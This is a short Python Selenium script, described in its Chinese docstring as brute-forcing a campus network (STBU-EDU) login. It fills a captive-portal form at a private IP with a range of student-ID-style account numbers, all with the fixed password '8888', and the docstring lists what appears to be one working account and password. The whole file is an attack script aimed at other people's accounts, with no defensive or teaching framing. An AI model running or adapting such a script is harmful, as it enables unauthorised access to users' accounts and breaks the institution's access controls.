# -*- coding: utf-8 -*-
"""
Created on Sun Nov  5 20:52:54 2017

@author: YingJoy

# 暴力破解校园网STBU-EDU
2016122014 8888
"""

import time
from selenium import webdriver

# 初始化
url = 'http://172.21.160.114:8080/portal/templatePage/20160629121614757/login_custom.jsp?userip=172.18.13.152&userurl=http://172.18.13.1'
option = webdriver.ChromeOptions()
option.add_argument('disable-infobars')
option.add_argument('start-maximized')
browser = webdriver.Chrome(chrome_options = option)

browser.get(url)

account = browser.find_element_by_xpath('//*[@id="id_userName"]')
pwd = browser.find_element_by_xpath('//*[@id="id_userPwd"]')
ok = browser.find_element_by_xpath('//*[@id="id_lable_loginbutton_auth"]/span')
error = browser.find_element_by_xpath('//*[@id="id_errorMessage"]')

account_arr = [x for x in range(2016122001, 2016122099)]

#while (browser.current_url == url):
#    for i in account_arr:
if (error.get_attribute('style')[9:-1] == 'none'):
    for i in account_arr:
        account.send_keys(i)
        pwd.send_keys('8888')
        ok.click()
        account.clear()
        pwd.clear()
        time.sleep(0.2)
i = i - 1